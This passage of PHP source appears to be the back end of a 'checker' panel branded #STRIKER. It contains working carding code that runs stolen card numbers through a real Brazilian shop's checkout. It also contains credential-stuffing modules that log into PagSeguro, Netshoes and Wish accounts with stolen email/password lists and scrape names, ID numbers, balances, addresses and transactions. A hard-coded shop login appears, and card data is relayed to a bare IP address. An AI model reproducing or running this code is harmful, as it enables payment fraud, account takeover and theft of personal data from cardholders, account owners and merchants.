  die("<font color='lime'> Aprovada </font>➜ $lista |  Retorno: Unauthorized. Invalid security code| ");
}else if (strpos($exec5, 'Pague com a Rede:<\/strong>') !==false){

$msg = puxar($exec5,'Pague com a Rede:<\/strong>','\t\t\t<\/div>');
echo "Reprovada ➔ $lista | Retorno: [<font color='red'>$msg</font>] <br>";
}else{
    $cod =  "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $cc|$mes|$ano|$cvv | $msg |- #STRIKER";
    }
echo $cod;
break;
case 'allbins2':
error_reporting(0);
function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET["lista"];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

function getStr2($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

$loadtime = time();
function getStrc($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}
switch ($mes) {
    case '1': $mes = '01';
        break;
    case '4': $mes = '04';
        break;
    case '7': $mes = '07';
        break;
    case '2': $mes = '02';
        break;
    case '5': $mes = '05';
        break;
    case '8': $mes = '08';
        break;
    case '3': $mes = '03';
        break;
    case '6': $mes = '06';
        break;
    case '9': $mes = '09';
        break;

}
switch ($ano) {
         case '19':$ano = '2019';break;
         case '20':$ano = '2020';break;
         case '21':$ano = '2021';break;
         case '22':$ano = '2022';break;
         case '23':$ano = '2023';break;
         case '24':$ano = '2024';break;
         case '25':$ano = '2025';break;
         case '26':$ano = '2026';break;
         case '27':$ano = '2027';break;
         case '28':$ano = '2028';break;

}

$nome1 = array('jose', 'marcos', 'rodrigues', 'merenda', 'douglas', 'henrique', 'moraes', 'renana', 'felipe');
$nome2 = array('silva', 'leonardo', 'silveira', 'rodrigues', 'anjo', 'linda', 'morena', 'gatatunes', 'silvano');



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://nsshop.com.br/login");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: nsshop.com.br',
'Origin: https://nsshop.com.br',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: okhttp/3.10.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Referer: https://nsshop.com.br/login',
));

curl_setopt($ch, CURLOPT_POSTFIELDS, 'Users%5Bemail%5D=danielsantosdosp%40gmail.com&Users%5Bpassword%5D=Daniel1966%40');

 $fim1 = curl_exec($ch);
 //echo $fim1;




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://nsshop.com.br/cart/addcart");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: nsshop.com.br',
'Origin: https://nsshop.com.br',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: okhttp/3.10.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Referer: https://nsshop.com.br/categoria/dewalt',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'id=48948&price=20.00000&quantity=1');

 $fim2 = curl_exec($ch);
 //echo $fim2;




$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://nsshop.com.br/cart/checkout");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: nsshop.com.br',
'User-Agent: okhttp/3.10.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Referer: https://nsshop.com.br/cart/carrinho',
));

 $fim3 = curl_exec($ch);
 //echo $fim3;


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://nsshop.com.br/cart/dadospedido/04510");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: nsshop.com.br',
'User-Agent: okhttp/3.10.0',
'Accept: application/json, text/javascript, */*; q=0.01',
'Referer: https://nsshop.com.br/cart/checkout',
));

 $fim4 = curl_exec($ch);
 //echo $fim4;


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://nsshop.com.br/cart/finaliza");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: nsshop.com.br',
'Origin: https://nsshop.com.br',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: okhttp/3.10.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Referer: https://nsshop.com.br/cart/checkout',
));

curl_setopt($ch, CURLOPT_POSTFIELDS, 'frete_entrega=04014&numero_cartao='.$cc.'&mes_cartao='.$mes.'&ano_cartao='.$ano.'&cod_seguranca='.$cvv.'&num_parcela=1&finalizar_pagamento=CC');

$fim = curl_exec($ch);
//echo $fim;
$retorno = getStr2($fim, '<div class="form-group col-lg-12 col-md-12 col-sm-12 col-xs-12 alert alert-info">', '</div>');




$valores = array('R$ 1,00','R$ 50,50','R$ 50,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];
if (strpos($fim, `Não Autorizado - 63 - 5 - Autorizacao negada") !== false) {

echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜  $cc|$mes|$ano|$cvv | Debitou : $debitouu | Tempo de Resposta: ". (time() - $loadtime) ." seg |<span class='badge badge-light'> $bin</span>  - #striker-";
debitar_creditos("1.00");
contar_cc();
}else if(stripos($fim, 'invalid security code') !==false ){
	
  die("<font color='lime'> Aprovada </font>➜ $lista |  Retorno: Unauthorized. Invalid security code| ");
}else if (strpos($fim, 'Pague com a Rede:<\/strong>') !==false){

$msg = puxar($fim,'Pague com a Rede:<\/strong>','\t\t\t<\/div>');
echo "Reprovada ➔ $lista | Retorno: [<font color='red'>$retorno</font>] <br>";
}else{
    $cod =  "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $cc|$mes|$ano|$cvv | $msg |- #STRIKER";
    }
echo $cod;
break;
  case 'pagsegs':


extract($_GET);
error_reporting(0);

$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

    function soNumero($str) {
        return preg_replace("/[^0-9]/", "", $str);
    }


function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


function getString($string, $start, $end, $value)
{
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}



if (file_exists(getcwd() . '/cookie.txt')) {
    unlink(getcwd() . '/cookie.txt');
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == 'GET') {
    extract($_GET);
}

function getStr2($string,$start,$end) {
  $str = explode($start,$string);
  $str = explode($end,$str[1]);
  return $str[0];
}


function Curl($url = false, $post = false, $header = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        if ($post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if ($header) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        }
        $exec = curl_exec($ch);
        return $exec;
    }
//*//*#Curl//*////*//

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://mb.api.pagseguro.uol/auth");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/americanas.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/americanas.txt");
    curl_setopt($ch, CURLOPT_USERAGENT, "PagSeguro release/3.16.2 (br.com.uol.ps.myaccount; build:195; Android 4.4.2)");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'App-Version: 3.16.2',
        'Host: mb.api.pagseguro.uol',
        'Content-Type: application/json; charset=UTF-8',
        'App-Device: samsung / SM-G930K',
        'App-OS: Android 4.4.2 / Api-19',
        'App-User: samsung / SM-G930K Android 4.4.2 / Api-19',
        'Connection: Keep-Alive'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"password":"'.$senha.'","userName":"'.$email.'"}');
    $resposta = curl_exec($ch);
    //echo $resposta;

    $dados = json_decode($resposta, true);
    $token = $dados['accessToken'];

    //echo $data['name'];

    if (strpos($resposta, 'PF')) {
        $tipo = "Pessoa Física";
    }else{
        $tipo = "Pessoa Juridica";
    }



    if (strpos($resposta, 'name')) {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://mb.api.pagseguro.uol/transactions?daysBefore=120&page=1&operationType=ALL");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/americanas.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/americanas.txt");
    curl_setopt($ch, CURLOPT_USERAGENT, "PagSeguro release/3.16.2 (br.com.uol.ps.myaccount; build:195; Android 4.4.2)");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'App-Version: 3.16.2',
        'Host: mb.api.pagseguro.uol',
        'Content-Type: application/json; charset=UTF-8',
        'App-Device: samsung / SM-G930K',
        'App-OS: Android 4.4.2 / Api-19',
        'App-User: samsung / SM-G930K Android 4.4.2 / Api-19',
        'X-Token: '.$token.'',
        'Connection: Keep-Alive'));
    $resposta2 = curl_exec($ch);

    $dados2 = json_decode($resposta2, true);
    $dados2 = $dados2['lastTransactions'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://mb.api.pagseguro.uol/balances");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/americanas.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/americanas.txt");
    curl_setopt($ch, CURLOPT_USERAGENT, "PagSeguro release/3.16.2 (br.com.uol.ps.myaccount; build:195; Android 4.4.2)");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'App-Version: 3.16.2',
        'Host: mb.api.pagseguro.uol',
        'Content-Type: application/json; charset=UTF-8',
        'App-Device: samsung / SM-G930K',
        'App-OS: Android 4.4.2 / Api-19',
        'App-User: samsung / SM-G930K Android 4.4.2 / Api-19',
        'X-Token: '.$token.'',
        'Connection: Keep-Alive'));
    $resposta3 = curl_exec($ch);
    $dados3 = json_decode($resposta3, true);

echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha <span class='badge badge-info'>  ".$dados['name']." </span>&nbsp <span class='badge badge-info'> ".$dados['document']." </span>&nbsp Transações (120 dias): <span class='badge'> ".count($dados2)." </span> <span class='badge badge-info'> ".$dados['pagSeguroUserType']." </span>&nbsp <span class='badge badge-info'> ".$tipo." </span>&nbsp <span class='badge badge-info'> R$ ".$dados3['balanceAvailable']." </span> &nbsp <span class='badge badge-info'> R$ ".$dados3['balanceReceivable']." </span> &nbsp <span class='badge badge-info'> R$ ".$dados3['balanceBlocked']." </span> <span class='badge badge-info'> - #STRIKER-";
debitar_creditos("0.05");
contar_login();
}else{
          echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha - #STRIKER";



}

break;
  case 'nethsoes':


extract($_GET);
error_reporting(0);

$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

    function soNumero($str) {
        return preg_replace("/[^0-9]/", "", $str);
    }


function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


function getString($string, $start, $end, $value)
{
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}



if (file_exists(getcwd() . '/cookie.txt')) {
    unlink(getcwd() . '/cookie.txt');
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == 'GET') {
    extract($_GET);
}

function getStr2($string,$start,$end) {
  $str = explode($start,$string);
  $str = explode($end,$str[1]);
  return $str[0];
}


function Curl($url = false, $post = false, $header = false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) ."/cookie_.txt");
        curl_setopt($ch, CURLOPT_TIMEOUT, 25);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        if ($post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if ($header) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        }
        $exec = curl_exec($ch);
        return $exec;
    }
//*//*#Curl//*////*//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://prd-free-mobile-api.ns2online.com.br/login');
curl_setopt($ch, CURLOPT_USERAGENT, 'Netshoes App');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'storeId: L_NETSHOES',
        'uuid: bd851968-caa5-47dd-8eef-e8d3308b65ab_anonymous',
        'trackId: bd851968-caa5-47dd-8eef-e8d3308b65ab',
        'Pragma: akamai-x-get-cache-key',
        'X-NS-hasCartItems: false',
        'Content-Type: application/json; charset=UTF-8',
        'Host: prd-free-mobile-api.ns2online.com.br',
        'Connection: Keep-Alive'));
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"password":"'.$senha.'","identifier":"'.$email.'"}');
$fim = curl_exec($ch);
    $resposta = curl_exec($ch);
    $dados = json_decode($fim, true);
    $auth = $dados['access_token'];
    $id = $dados['id'];

    if (strpos($resposta, 'uuid')) {

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://prd-free-mobile-api.ns2online.com.br/customers/secure/me');
curl_setopt($ch, CURLOPT_USERAGENT, 'Netshoes App');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'storeId: L_NETSHOES',
            'uuid: bd851968-caa5-47dd-8eef-e8d3308b65ab_anonymous',
            'trackId: bd851968-caa5-47dd-8eef-e8d3308b65ab',
            'Pragma: akamai-x-get-cache-key',
            'X-NS-hasCartItems: false',
            'Content-Type: application/json; charset=UTF-8',
            'Authorization: bearer '.$auth.'',
            'Host: prd-free-mobile-api.ns2online.com.br',
            'Connection: Keep-Alive'));
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/americanas.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/americanas.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$fim2 = curl_exec($ch);
        $dados2 = json_decode($fim2, true);
        $dadosLogin = $dados2['address'];
        $dadosLogin2 = $dados2['person'];
        $saldo = GetStr($getss, '"activeTotalBalanceInCents":',',"');
        $saldo2 = number_format($saldo / 100, 2, ',', '.');


        if (strpos($resposta2, 'oneClickEnabled":false')) {
            $oneClick = "<span class='badge badge-danger'>Oneclick Desabilitado</span>";
        }else{
            $oneClick = "<span class='badge badge-success'>Oneclick Habilitado</span>";
        }



echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha <span class='badge badge-info'> ".$dadosLogin['recipientName']." </span>&nbsp <span class='badge badge-info'> ".$dadosLogin['state']." - ".$dadosLogin['city']."] </span>&nbsp ".$oneClick." <span class='badge badge-info'> Saldo: ".$saldo2." </span> - #STRIKER-";
debitar_creditos("0.10");
contar_login();
}else{
          echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha - #STRIKER";
}
break;


echo $cod;




break;
case 'hiper':
error_reporting(0);
set_time_limit(0);
$loadtime = time();

$get = $_GET['lista'];
$split = explode("|",$get);
$cc = $split[0];
$mes = $split[1];
$ano = $split[2];
$cvv = $split[3];


function getStr($string,$start,$end){
  $str = explode($start,$string);
  $str = explode($end,$str[1]);
  return $str[0];
}



$url = file_get_contents("http://65.52.37.41/hiper.php?lista=$cc|$mes|$ano|$cvv");

if(strpos($url, "Digite sua senha"));{
echo $url;
debitar_creditos("1.00");
contar_cc();
}
		
	
break;
  case 'wish':
  extract($_GET);
  $separar = explode("|", $lista);
  $email = $separar[0];
  $senha = $separar[1];

  function getStr($string, $start, $end) {
      $str = explode($start, $string);
      $str = explode($end, $str[1]);
      return $str[0];
  }

      function soNumero($str) {
          return preg_replace("/[^0-9]/", "", $str);
      }


  function inStr($string, $start, $end, $value) {
      $str = explode($start, $string);
      $str = explode($end, $str[$value]);
      return $str[0];
  }

  function getString($string, $start, $end, $value)
  {
      $str = explode($start, $string);
      $str = explode($end, $str[$value]);
      return $str[0];
  }

  $ckfile = getcwd() . "/cookie_.txt";
  if (file_exists($ckfile))
      unlink($ckfile);
  /* deletar cookies */
  $lis = scandir(getcwd());
  foreach ($lis as $v) {
      if (strpos($v, "/cookie_.txt") !== false) {
          if (file_exists($v))
              unlink($v);
      }
  }


  function Curl($url = false, $post = false, $header = false) {
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($ch, CURLOPT_HEADER, 1);
          curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) ."/cookie_.txt");
          curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) ."/cookie_.txt");
          curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) ."/cookie_.txt");
          curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) ."/cookie_.txt");
          curl_setopt($ch, CURLOPT_TIMEOUT, 25);
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
          if ($post) {
              curl_setopt($ch, CURLOPT_POST, 1);
              curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
          }
          if ($header) {
              curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
          }
          $exec = curl_exec($ch);
          return $exec;
      }
  //*//*#Curl//*////*//
  $step = Curl("https://www.wish.com/api/email-login", '', array(''));
  //*//*#Curl//*////*//
  $bsid = getStr($step, 'set-cookie: bsid=', ';');
  //*//*#Curl//*////*//
  $step1 = Curl("https://www.wish.com/api/email-login", 'email=' . $email . '&password=' . $senha . '&app_device_id=f42ab1f2-1a8e-32b4-ad80-74fd701b1967&_xsrf=1&_client=androidapp&_capabilities%5B%5D=2&_capabilities%5B%5D=3&_capabilities%5B%5D=4&_capabilities%5B%5D=6&_capabilities%5B%5D=7&_capabilities%5B%5D=9&_capabilities%5B%5D=11&_capabilities%5B%5D=12&_capabilities%5B%5D=13&_capabilities%5B%5D=15&_capabilities%5B%5D=18&_capabilities%5B%5D=21&_capabilities%5B%5D=24&_capabilities%5B%5D=25&_capabilities%5B%5D=28&_capabilities%5B%5D=35&_capabilities%5B%5D=37&_capabilities%5B%5D=39&_capabilities%5B%5D=40&_capabilities%5B%5D=43&_capabilities%5B%5D=46&_capabilities%5B%5D=47&_capabilities%5B%5D=49&_capabilities%5B%5D=50&_capabilities%5B%5D=51&_capabilities%5B%5D=52&_capabilities%5B%5D=53&_capabilities%5B%5D=55&_capabilities%5B%5D=56&_capabilities%5B%5D=57&_capabilities%5B%5D=58&_capabilities%5B%5D=59&_capabilities%5B%5D=60&_capabilities%5B%5D=61&_capabilities%5B%5D=62&_capabilities%5B%5D=64&_capabilities%5B%5D=65&_capabilities%5B%5D=66&_capabilities%5B%5D=67&_capabilities%5B%5D=68&_capabilities%5B%5D=69&_capabilities%5B%5D=71&_app_type=wish&_is_using_google_branded_android_pay=true&_riskified_session_token=0be52cb2-40ad-4600-9f7f-f59c5153a900&_threat_metrix_session_token=7625-892fffb6-f1cb-42a4-ae25-3163b9b1a7fa&advertiser_id=e8879d6d-dd0f-4689-8fae-24670fe75bc1&_version=4.11.5&app_device_model=GT-P5210', array('Host: www.wish.com','Cookie: _xsrf="1"; _appLocale="pt_BR"; bsid="' . $bsid . '"; _timezone="8.0"; _timezone_id="Asia/Shanghai"',
    'User-Agent: Mozilla/5.0 (Linux; Android 4.4.4; GT-P5210 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36','Connection: Keep-Alive','Content-Type: application/x-www-form-urlencoded'));

  $sweeper_session = getStr($step1, 'sweeper_session=', ';');
  $bsid = getStr($step1, 'bsid=', ';');
  $sweeper_uuid = getStr($step1, '"sweeper_uuid": "', '"');
  $tokens = array(
      "Cookie: sweeper_session= $sweeper_session;",
      "bsid= $bsid;"
    );
  //*//*#Curl//*////*//
  $step3 = Curl("https://www.wish.com/transaction", '', array(''));

  $totalped = count(explode('max_fulfillment_time', $step3)) - 1;

  if (strpos($step3, "['transactions'] = [];") !== false) {
  $compra = 'NÃO';
  }else{
  $compra = 'SIM ';
  }
  //*//*#Curl//*////*//
  $step4 = Curl("https://www.wish.com/api/settings/get", ' ', array(    'x-xsrftoken: 2|5a3faa38|4a9e2536721c556e37ceeee30ae06a8d|1531804323',
      'cookie: bsid=' . $bsid . '; sessionRefreshed_5b47e137cf9cfd7439c38c15=true; sweeper_session=' . $sweeper_session . '; __utma=96128154.1907912247.1531792996.1531792996.1531801884.2; __utmc=96128154; __utmz=96128154.1531792996.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); cto_lwid=2f769954-8012-4ccf-b15d-6cc9ad5bc201; lastRskxRun=1531793033384; rCookie=2k2270e2f5uxycbdoqbak; rskxRunCookie=0; _xsrf=2|5a3faa38|4a9e2536721c556e37ceeee30ae06a8d|1531804323; G_ENABLED_IDPS=google; __stripe_mid=db9e0de8-ee3b-47e7-ac5a-a323442082c8; _ga=GA1.2.1907912247.1531792996; _gid=GA1.2.20633699.1531804932; _timezone=3; __stripe_sid=45c56ea1-86a9-4f0e-a045-8c0b30a302fa; sweeper_uuid=' . $sweeper_uuid . ''));
  //*//*#Curl//*////*//
  $city = getStr($step4, 'city": "', '"');
  $state = getStr($step4, 'state": "', '",');
  $phone_number = getStr($step4, 'phone_number": "', '",');
  //*//*#Curl//*////*//
  $dropp = 'Cidade: '.$city.'/'.$city.' Tel: '.$phone_number.'';
  //*//*#Curl//*////*//
  if (strpos($step4, "card_type") !== false) {
  $card = ' SIM ';
  }else{
  $card = ' NÃO ';
  }
  //*//*#Curl//*////*//
  $step5 = Curl("https://www.wish.com/api/user/info", ' ', array(    'x-xsrftoken: 2|5a3faa38|4a9e2536721c556e37ceeee30ae06a8d|1531804323',
      'cookie: bsid=' . $bsid . '; sessionRefreshed_5b47e137cf9cfd7439c38c15=true; sweeper_session=' . $sweeper_session . '; __utma=96128154.1907912247.1531792996.1531792996.1531801884.2; __utmc=96128154; __utmz=96128154.1531792996.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); cto_lwid=2f769954-8012-4ccf-b15d-6cc9ad5bc201; lastRskxRun=1531793033384; rCookie=2k2270e2f5uxycbdoqbak; rskxRunCookie=0; _xsrf=2|5a3faa38|4a9e2536721c556e37ceeee30ae06a8d|1531804323; G_ENABLED_IDPS=google; __stripe_mid=db9e0de8-ee3b-47e7-ac5a-a323442082c8; _ga=GA1.2.1907912247.1531792996; _gid=GA1.2.20633699.1531804932; _timezone=3; __stripe_sid=45c56ea1-86a9-4f0e-a045-8c0b30a302fa; sweeper_uuid=' . $sweeper_uuid . ''));
  //*//*#Curl//*////*//
  $wish_cash_balance = getStr($step5, 'wish_cash_balance": "', '",');
  //*//*#Curl//*////*//
  $retorno = getStr($step1, 'msg": "', '",');
  //*//*#Curl//*////*//
  /*
  echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha <span class='badge badge-info'> ".$dadosLogin['recipientName']." </span>&nbsp <span class='badge badge-info'> ".$dadosLogin['state']." - ".$dadosLogin['city']."] </span>&nbsp ".$oneClick." <span class='badge badge-info'> Saldo: ".$saldo2." </span> - #STRIKER-";
  debitar_creditos("0.10");
  contar_login();
  }else{
            echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha - #STRIKER";
  */
  if (strpos($step1, 'session_token')) {
    echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $email | $senha <span class='badge badge-info'> Compras: $compra $dropp </span>&nbsp <span class='badge badge-info'> Card: $card </span> <span class='badge badge-info'>SaldoConta: $wish_cash_balance </span>  - #STRIKER-";
    debitar_creditos("0.10");
    contar_login();

  //*//*#If die//*////*//
  }else{
    echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $email | $senha Retorno: $retorno- #STRIKER";

  }


         



break;
  case 'ingresso':


extract($_GET);
error_reporting(0);

$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

    function soNumero($str) {
